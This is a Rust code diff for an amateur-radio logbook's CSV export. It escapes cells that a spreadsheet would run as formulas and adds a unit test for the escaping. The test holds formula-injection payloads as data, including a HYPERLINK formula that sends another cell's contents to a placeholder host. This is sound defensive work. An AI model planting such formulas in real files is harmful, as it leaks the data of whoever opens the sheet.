@@ -184,12 +184,17 @@ pub fn adif(qsos: &[Qso], program_version: &str, mode: &str) -> String {
     out
 }
 
-/// RFC 4180: quoted when it holds a comma, a quote or a line break.
+/// RFC 4180: quoted when it holds a comma, a quote or a line break. Text that
+/// a spreadsheet would run as a formula (it starts with = + - @, a tab or a
+/// carriage return, and is not just a number) gets a leading apostrophe, so it
+/// stays text: names and QTHs come from other stations.
 fn cell(v: &str) -> String {
+    let formula = v.starts_with(['=', '+', '-', '@', '\t', '\r']) && v.trim().parse::<f64>().is_err();
+    let v = if formula { format!("'{v}") } else { v.to_string() };
     if v.contains([',', '"', '\r', '\n']) {
         format!("\"{}\"", v.replace('"', "\"\""))
     } else {
-        v.to_string()
+        v
     }
 }
 
@@ -411,6 +416,23 @@ mod tests {
         assert_eq!(select(all.clone(), false).len(), 2);
         let finals = select(all, true);
         assert_eq!(finals.iter().map(|q| q.id.as_str()).collect::<Vec<_>>(), ["q1"]);
+    }
+
+    /// A name or QTH comes from the other station: a cell that a spreadsheet
+    /// would run as a formula is kept as text.
+    #[test]
+    fn csv_keeps_formulas_from_other_stations_as_text() {
+        let mut q = qso();
+        q.name = Some("=HYPERLINK(\"http://x/?\"&B2,\"QSL\")".into());
+        q.qth = Some("+1+1".into());
+        q.notes = Some("@SUM(A1)".into());
+        q.rst_sent = Some("-10".into());
+        let text = csv(&[q]);
+        let row = text.trim_start_matches('\u{feff}').split("\r\n").nth(1).unwrap().to_string();
+        assert!(row.contains(",\"'=HYPERLINK(\"\"http://x/?\"\"&B2,\"\"QSL\"\")\","), "{row}");
+        assert!(row.contains(",'+1+1,"), "{row}");
+        assert!(row.contains(",'@SUM(A1)"), "{row}");
+        assert!(row.contains(",-10,"), "a plain negative number stays a number: {row}");
     }
 
     #[test]
